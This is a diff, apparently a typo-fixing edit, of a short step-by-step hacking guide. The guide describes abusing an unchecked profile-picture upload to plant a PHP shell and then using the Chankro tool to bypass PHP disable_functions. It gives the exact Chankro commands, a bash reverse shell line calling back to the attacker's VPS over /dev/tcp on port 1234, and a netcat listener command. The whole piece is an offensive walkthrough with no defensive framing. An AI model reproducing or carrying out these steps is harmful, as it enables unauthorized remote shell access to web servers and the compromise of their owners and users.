@@ -1,16 +1,16 @@
-for this hack we should firs found a one way for upload file 
+for this hack we should first found a one way for upload file 
 for example i found one way in profile when we add image for profile the server don't check the file passvand 
-and i coud added the my shell code 
-because i coudn't access the server because exist the role in php info file which disable_functions don't permission for access the server .
+and i coud added  my shell code 
+so i coudn't access the server because exist the role in php info file which disable_functions don't permission for access the server .
 
 for bypass this , i search and search and search so i found one way!
 i coud bypass this trend with Chankro 
 with this Steps
 1: install chankro with this link "https://github.com/TarlogicSecurity/Chankro"
 2: $ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
-3: modify the rev.sh and write this code "          bash -c "/bin/bash -i >& /dev/tcp/VPS IP /1234 0>&1""
-4:go to the site and run phpinfo file and locate DOCUMENT_ROOT and write this to KKK
+3: modify the rev.sh and write this code "          bash -c "/bin/bash -i >& /dev/tcp/VPS IP /1234 0>&1"     "
+4: go to the site and run phpinfo file and locate DOCUMENT_ROOT and write this to KKK
 5: $ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path KKK
 6: upload chan.php after creat in web
 7: write the code nc -nlvp 1234 in your vps 
-8:end .
+8: end .
